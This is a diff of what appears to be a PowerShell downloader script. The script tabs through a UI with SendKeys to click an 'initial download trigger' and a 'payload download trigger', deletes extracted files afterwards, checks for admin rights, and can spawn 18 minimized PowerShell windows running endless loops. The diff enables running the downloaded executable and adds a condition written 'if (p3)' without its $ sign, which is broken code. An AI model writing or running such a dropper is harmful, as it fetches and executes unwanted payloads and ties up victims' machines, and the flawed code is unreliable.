@@ -16,7 +16,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetUnoFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 60
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 50
 }
 if($targetUnoFound){
 Write-Host "Striking initial download trigger..."
@@ -41,7 +41,7 @@ Write-Host "Success! Selection landed on target element name: '$currentName' aft
 $targetDosFound=$true;break
 }
 }
-$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 60
+$Shell.SendKeys("{TAB}");$tabCount++;Start-Sleep -Milliseconds 50
 }
 if($targetDosFound){
 Write-Host "Striking payload download trigger..."
@@ -111,7 +111,7 @@ if($null -ne $subZip -and(Test-Path -LiteralPath $subZip.FullName)){Remove-Item 
 if($null -ne $targetExtractPath -and(Test-Path -LiteralPath $targetExtractPath)){Remove-Item -LiteralPath $targetExtractPath -Recurse -Force -ErrorAction SilentlyContinue}
 Write-Host "Workflow completed successfully!"
 }
-$runExe=$false;$p1=$true;$p2=$false
+$runExe=$true;$p1=$true;$p2=$false;$p3=$false
 if(!($p1) -and !($openUrl)){[Environment]::Exit(0)}
 $isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if($isAdmin){
@@ -175,6 +175,7 @@ break
 }
 }
 }
+if (p3){
 $count = 18
 $command = '
 while ($true) {
@@ -186,6 +187,7 @@ break
 '
 1..$count | ForEach-Object{
 Start-Process powershell.exe -WindowStyle Minimized -ArgumentList "-NoExit", "-Command", $command
+}
 }
 [Environment]::Exit(0)
 #
